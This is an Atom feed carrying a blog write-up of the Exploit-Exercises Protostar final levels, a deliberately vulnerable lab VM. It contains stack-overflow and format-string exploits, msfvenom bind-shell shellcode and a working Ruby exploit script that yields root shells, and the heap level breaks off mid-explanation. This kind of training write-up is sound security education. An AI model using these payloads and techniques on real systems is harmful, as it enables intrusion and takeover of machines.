<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit-exercises | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/exploit-exercises/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-07-06T17:36:02+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Final Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels/"/>
    <updated>2015-07-06T08:14:11+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Final0</h2>

<p>{% codeblock lang:c final0.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;final0&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2995</h1>

<p>/<em>
 * Read the username in from the network
 </em>/</p>

<p>char <em>get_username()
{
  char buffer[512];
  char </em>q;
  int i;</p>

<p>  memset(buffer, 0, sizeof(buffer));
  gets(buffer);</p>

<p>  /<em> Strip off trailing new line characters </em>/
  q = strchr(buffer, &lsquo;\n&rsquo;);
  if(q) <em>q = 0;
  q = strchr(buffer, &lsquo;\r&rsquo;);
  if(q) </em>q = 0;</p>

<p>  /<em> Convert to lower case </em>/
  for(i = 0; i &lt; strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }</p>

<p>  /<em> Duplicate the string and return it </em>/
  return strdup(buffer);
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  username = get_username();</p>

<p>  printf(&ldquo;No such user %s\n&rdquo;, username);
}
{% endcodeblock %}</p>

<p>We attach to the process as root to find the offset with stored EIP.</p>

<p>{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -p 27474
Attaching to process 27474
&hellip;
gdb> c
[New process 27485]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ echo &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A&rdquo; | nc 0 2995</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 27485]</p>

<hr />

<pre><code> eax:0804B008 ebx:35724134  ecx:00000000  edx:00000001     eflags:00010286
 esi:00000000 edi:00000000  esp:BFFFF780  ebp:41367241     eip:72413772
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</code></pre>

<p>[007B:BFFFF780]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF7B0 : 01 00 00 00  54 F8 FF BF - 5C F8 FF BF  48 18 FE B7 &hellip;.T&hellip;&#8230;H&hellip;
BFFFF7A0 : B0 98 04 08  00 00 00 00 - 28 F8 FF BF  76 DC EA B7 &hellip;&hellip;..(&hellip;v&hellip;
BFFFF790 : 65 63 EC B7  40 10 FF B7 - 04 00 00 00  F4 7F FD B7 ec..@&hellip;&hellip;&hellip;..
BFFFF780 : 38 41 72 39  41 73 30 41 - 73 31 41 73  32 41 00 BF 8Ar9As0As1As2A..
[007B:0804B008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
0804B008 : 41 41 30 41  41 31 41 41 - 32 41 41 33  41 41 34 41 AA0AA1AA2AA3AA4A
0804B018 : 41 35 41 41  36 41 41 37 - 41 41 38 41  41 39 41 42 A5AA6AA7AA8AA9AB
[0073:72413772]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x72413772: Error while running hook_stop:
Cannot access memory at address 0x72413772
0x72413772 in ?? ()</p>

<h1>window2:</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772
[*] Exact match at offset 532</p>

<h1>window1:</h1>

<p>gdb> i r
eax            0x804b008    0x804b008
ecx            0x0  0x0
edx            0x1  0x1
ebx            0x35724134   0x35724134
esp            0xbffff780   0xbffff780
ebp            0x41367241   0x41367241
esi            0x0  0x0
edi            0x0  0x0
eip            0x72413772   0x72413772
eflags         0x10286  [ PF SF IF RF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33</p>

<p>gdb> x /x 0x804b008
0x804b008:  0x41304141
gdb> x /s 0x804b008
0x804b008:   &ldquo;AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG&rdquo;&hellip;
{% endcodeblock %}</p>

<p>So EAX points at the beginning to the buffer and we are lucky, because there is also <code>call eax</code> in binary.
{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0
[final0]
0x08048d5f call eax
0x0804992b call eax
0x08054f4b call eax
0x08054f4b call eax
{% endcodeblock %}</p>

<p>We use <code>msfvenom</code> to generate bind shell, port <code>2449</code>, without newline characters and with uppercase encoding:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo;
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 224 (iteration=0)
Payload size: 224 bytes
???t$?[SYIIICCCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQYKL7JCQCQS1CSZTBK9KQNPCV8MK01K1N1B3XC2C0C9LQ2J4PF160K9KQCZ560X8MK0K91QTDH3DDX02F8MK0PC80RFHMMPZ3V9RJWOV8HMK0PIT9KHCX6OVOT3RHRHVOCRU9BNMYM30PPSLIKQNPDKXMK0AA
{% endcodeblock %}</p>

<p>The lower case <code>t</code> at the beginning of the payload is used in order to find the payload&rsquo;s absolute location in memory and obtain a position-independent shellcode,
more <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>.</p>

<p>Because we can refer to this position also with the register <code>eax</code>, we can get rid of lower case character:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo; BufferRegister=EAX
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 217 (iteration=0)
Payload size: 217 bytes
PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIVQIKJWZC0SQS0S3Z4BK9M1X0CVHMMP1KQN1B3XER5P39J1RJTPV10PLIM1SZCVV88MMPMYW1S4H3ETH0BFHMMPPCNP3VHMK0MC69SZ7OF8XMMPW9BYKHSXFOFOSCSX3X6O52RI2NK9ZC0P63MYM1X04K8MMPAA
{% endcodeblock %}</p>

<p>Exploit:
{% codeblock language:ruby exploit-final0.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0</h1>

<h1>[final0]</h1>

<h1>0x08048d5f call eax</h1>

<h1>0x0804992b call eax</h1>

<h1>0x08054f4b call eax</h1>

<h1>0x08054f4b call eax</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772</h1>

<h1>[*] Exact match at offset 532</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo; BufferRegister=EAX -f ruby</h1>

<p>buf =
&ldquo;\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a&rdquo; +
&ldquo;\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48&rdquo; +
&ldquo;\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51&rdquo; +
&ldquo;\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43&rdquo; +
&ldquo;\x4a\x4a\x49\x36\x51\x49\x4b\x4c\x37\x4a\x43\x36\x33\x50&rdquo; +
&ldquo;\x43\x56\x33\x43\x5a\x53\x32\x4d\x59\x4d\x31\x48\x30\x33&rdquo; +
&ldquo;\x56\x58\x4d\x4d\x50\x31\x4b\x31\x4e\x31\x42\x42\x48\x54&rdquo; +
&ldquo;\x42\x35\x50\x53\x39\x4a\x31\x32\x4a\x32\x30\x46\x31\x56&rdquo; +
&ldquo;\x30\x4c\x49\x4d\x31\x52\x4a\x42\x46\x30\x58\x58\x4d\x4b&rdquo; +
&ldquo;\x30\x4d\x59\x31\x51\x44\x44\x38\x33\x55\x54\x4e\x50\x32&rdquo; +
&ldquo;\x46\x38\x4d\x4d\x50\x30\x43\x4e\x50\x45\x36\x38\x4d\x4b&rdquo; +
&ldquo;\x30\x5a\x33\x36\x39\x53\x5a\x47\x4f\x50\x58\x48\x4d\x4b&rdquo; +
&ldquo;\x30\x31\x59\x32\x59\x4a\x58\x45\x38\x36\x4f\x56\x4f\x32&rdquo; +
&ldquo;\x53\x53\x58\x35\x38\x46\x4f\x45\x32\x53\x59\x32\x4e\x4d&rdquo; +
&ldquo;\x59\x4a\x43\x36\x30\x56\x33\x4b\x39\x4d\x31\x58\x30\x44&rdquo; +
&ldquo;\x4b\x58\x4d\x4b\x30\x41\x41&rdquo;</p>

<p>exploit = buf + &ldquo;A&rdquo; * (532 - buf.length)
exploit &lt;&lt; [0x08048d5f].pack(&ldquo;V&rdquo;)</p>

<p>host = ARGV[0]
host ||= &ldquo;192.168.80.154&rdquo;</p>

<p>puts &ldquo;Using host: #{host}&rdquo;</p>

<p>s = TCPSocket.new host, 2995
s.puts(exploit)
s.close
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ./exploit-final0.rb
Using host: 192.168.80.154</p>

<p>user@protostar:/tmp$ nc 0 2449
id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<h2>Protostar Final1</h2>

<p>{% codeblock lang:c final1.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>include &lt;syslog.h></h1>

<h1>define NAME &ldquo;final1&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2994</h1>

<p>char username[128];
char hostname[64];</p>

<p>void logit(char *pw)
{
  char buf[512];</p>

<p>  snprintf(buf, sizeof(buf), &ldquo;Login from %s as [%s] with password [%s]\n&rdquo;, hostname, username, pw);</p>

<p>  syslog(LOG_USER|LOG_DEBUG, buf);
}</p>

<p>void trim(char <em>str)
{
  char </em>q;</p>

<p>  q = strchr(str, &lsquo;\r&rsquo;);
  if(q) <em>q = 0;
  q = strchr(str, &lsquo;\n&rsquo;);
  if(q) </em>q = 0;
}</p>

<p>void parser()
{
  char line[128];</p>

<p>  printf(&ldquo;[final1] $ &rdquo;);</p>

<p>  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, &ldquo;username &rdquo;, 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, &ldquo;login &rdquo;, 6) == 0) {
          if(username[0] == 0) {
              printf(&ldquo;invalid protocol\n&rdquo;);
          } else {
              logit(line + 6);
              printf(&ldquo;login failed\n&rdquo;);
          }
      }
      printf(&ldquo;[final1] $ &rdquo;);
  }
}</p>

<p>void getipport()
{
  int l;
  struct sockaddr_in sin;</p>

<p>  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &amp;sin, &amp;l) == -1) {
      err(1, &ldquo;you don&rsquo;t exist&rdquo;);
  }</p>

<p>  sprintf(hostname, &ldquo;%s:%d&rdquo;, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  getipport();
  parser();</p>

<p>}
{% endcodeblock %}</p>

<p>We don&rsquo;t use spaces to find our format string to have more spaces left for
exploit. Also, both <code>username</code> and <code>login</code> parameters are vulnerable, we use
<code>username</code> to store shellcode and <code>login</code> for overwriting <code>GOT entry</code> for
<code>puts()</code>. The line with timestamp is the entry from <code>/var/log/syslog</code> file.</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 70 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:24:42 (none) final1: Login from 127.0.0.1:54427 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612037320x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x434343430x6977205d0x702068740x777373610x2064726f0x2570255b0x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570]</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%p&rdquo; * 43 + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:26:22 (none) final1: Login from 127.0.0.1:54434 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612034330x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x43434343]</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + &ldquo;BBBBCCCC&rdquo;  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$p%43\$p&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ login failed
Jun 26 17:27:21 (none) final1: Login from 127.0.0.1:54435 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x424242420x43434343]
{% endcodeblock %}</p>

<p>We have 109 bytes for shellcode, not much but it should be sufficient.</p>

<p>{% codeblock %}
root@protostar:/tmp# objdump -t /opt/protostar/bin/final1  | grep username
0804a220 g     O .bss   00000080              username</p>

<p>user@protostar:/tmp$ objdump -TR /opt/protostar/bin/final1 | grep puts
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
0804a194 R_386_JUMP_SLOT   puts
{% endcodeblock %}</p>

<p>In order to pass this challenge, we need to store the address <code>0x0804a220</code> to
<code>0x0804a194</code>. Our <code>formatter.rb</code> is the same script as in the <code>protostar format</code>
challenges.</p>

<p>{% codeblock %}
user@protostar:/tmp$ ruby1.9.1 ./formatter.rb 42:0x0804a194:0x0804a220
ruby -e &lsquo;print [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;) + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo;&rsquo;
{% endcodeblock %}</p>

<p>Exploitation process:
{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
Reading symbols from /opt/protostar/bin/final1&hellip;done.
Starting program: /opt/protostar/bin/final1
[New process 29349]
[New process 29352]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$2044x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29352]
0x08a1a2bd in ?? ()</p>

<p>(gdb) x /x 0x0804a194
0x804a194 &lt;<em>GLOBAL_OFFSET_TABLE</em>+168>:  0x08a1a2bd
{% endcodeblock %}</p>

<p>So, we have <code>0x08a1a2bd</code> instead of <code>0x0804a220</code>, let&rsquo;s see the difference:
{% codeblock %}
0x08a1-0x0804 = 157
0xa2bd-0xa220 = 157
{% endcodeblock %}</p>

<p>Substracting <code>157</code> from <code>2044</code>, we got <code>1887</code> and that is the correct value, which we will use. Another try:</p>

<p>{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set detach-on-fork off&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;run&rsquo; /opt/protostar/bin/final1
Reading symbols from /opt/protostar/bin/final1&hellip;done.
Starting program: /opt/protostar/bin/final1
[New process 29370]
[New process 29373]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + &ldquo;A&rdquo; * 109 + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 29373]
0x0804a28e in username ()
(gdb) x /x 0x0804a194
0x804a194 &lt;<em>GLOBAL_OFFSET_TABLE</em>+168>:  0x0804a220
{% endcodeblock %}</p>

<p>That&rsquo;s correct, now we need to generate payload not longer than 109 bytes:</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/tools/payload_lengths.rb | awk &lsquo; $2&lt;=100&rsquo; | grep &lsquo;linux/x86&rsquo;
    linux/x86/adduser                                   97
    linux/x86/chmod                                     36
    linux/x86/exec                                      36
    linux/x86/meterpreter/bind_ipv6_tcp                 85
    linux/x86/meterpreter/bind_nonx_tcp                 63
    linux/x86/meterpreter/find_tag                      37
    linux/x86/meterpreter/reverse_ipv6_tcp              77
    linux/x86/meterpreter/reverse_nonx_tcp              50
    linux/x86/read_file                                 62
    linux/x86/shell/bind_ipv6_tcp                       85
    linux/x86/shell/bind_nonx_tcp                       63
    linux/x86/shell/find_tag                            37
    linux/x86/shell/reverse_ipv6_tcp                    77
    linux/x86/shell/reverse_nonx_tcp                    50
    linux/x86/shell_bind_ipv6_tcp                       90
    linux/x86/shell_bind_tcp                            78
    linux/x86/shell_bind_tcp_random_port                57
    linux/x86/shell_find_port                           62
    linux/x86/shell_find_tag                            69
    linux/x86/shell_reverse_tcp                         68
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2450 -b &lsquo;\x0a\x0d\x00&rsquo; -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 22 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 105 (iteration=0)
Payload size: 105 bytes
export buf=\
$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ export buf=\</p>

<blockquote><p>$&lsquo;\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9&rsquo;\
$&lsquo;\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66&rsquo;\
$&lsquo;\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b&rsquo;\
$&lsquo;\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54&rsquo;\
$&lsquo;\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48&rsquo;\
$&lsquo;\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12&rsquo;\
$&lsquo;\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68&rsquo;\
$&lsquo;\xd8\x45\xbb\x38\xd5\x98\xbc&rsquo;</p></blockquote>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;username &rdquo; + ENV[&ldquo;buf&rdquo;] + &ldquo;A&rdquo; * (109-105) + [0x0804a196].pack(&ldquo;V&rdquo;) + [0x0804a194].pack(&ldquo;V&rdquo;)  + &ldquo;\nlogin &rdquo; + &ldquo;%42\$1887x%42\$hn%43\$39452x%43\$hn&rdquo; + &ldquo;\n&rdquo;&rsquo;  | nc 0 2994
[final1] $ [final1] $ [final1] $ ^C
user@protostar:/tmp$ nc 0 2450
id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<h2>Protostar Final2</h2>

<p>{% codeblock lang:c final2.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>include &ldquo;../common/malloc.c&rdquo;</h1>

<h1>define NAME &ldquo;final2&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2993</h1>

<h1>define REQSZ 128</h1>

<p>void check_path(char <em>buf)
{
  char </em>start;
  char *p;
  int l;</p>

<p>  /<em>
  * Work out old software bug
  </em>/</p>

<p>  p = rindex(buf, &lsquo;/&rsquo;);
  l = strlen(p);
  if(p) {
      start = strstr(buf, &ldquo;ROOT&rdquo;);
      if(start) {
          while(*start != &lsquo;/&rsquo;) start&ndash;;
          memmove(start, p, l);
          printf(&ldquo;moving from %p to %p (exploit: %s / %d)\n&rdquo;, p, start, start &lt; buf ?  &ldquo;yes&rdquo; : &ldquo;no&rdquo;, start - buf);
      }
  }
}</p>

<p>int get_requests(int fd)
{
  char <em>buf;
  char </em>destroylist[256];
  int dll;
  int i;</p>

<p>  dll = 0;
  while(1) {
      if(dll >= 255) break;</p>

<pre><code>  buf = calloc(REQSZ, 1);
  if(read(fd, buf, REQSZ) != REQSZ) break;

  if(strncmp(buf, "FSRD", 4) != 0) break;

  check_path(buf + 4);     

  dll++;
</code></pre>

<p>  }</p>

<p>  for(i = 0; i &lt; dll; i++) {
                write(fd, &ldquo;Process OK\n&rdquo;, strlen(&ldquo;Process OK\n&rdquo;));
      free(destroylist[i]);
  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  get_requests(fd);</p>

<p>}
{% endcodeblock %}</p>

<p>The vulnerability is in this part of the source:
{% codeblock lang:c %}
  p = rindex(buf, &lsquo;/&rsquo;);
  l = strlen(p);</p>

<p>  if(p) {
      start = strstr(buf, &ldquo;ROOT&rdquo;);
      if(start) {
          while(*start != &lsquo;/&rsquo;) start&ndash;;
          memmove(start, p, l);
          printf(&ldquo;moving from %p to %p (exploit: %s / %d)\n&rdquo;, p, start, start &lt; buf ?  &ldquo;yes&rdquo; : &ldquo;no&rdquo;, start - buf);
      }
  }
{% endcodeblock %}</p>

<p>It expects message with the content <code>..../..ROOT.../next</code>, look for the rightmost <code>/</code>,
then searching for string <code>ROOT</code> and going leftside, it finds another <code>/</code>.</p>

<p>Finally, it copies <code>/next</code> after the left <code>/</code>, before <code>ROOT</code> and creates <code>..../next\x00T...</code></p>

<p>We need at least one slash, because <code>strlen(NULL)</code> segfaults. The security issue
is that if we don&rsquo;t set left slash, it continues to the left through different
chunk, for example:</p>

<p>{% codeblock %}
1st chunk: &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 + &ldquo;/&rdquo;
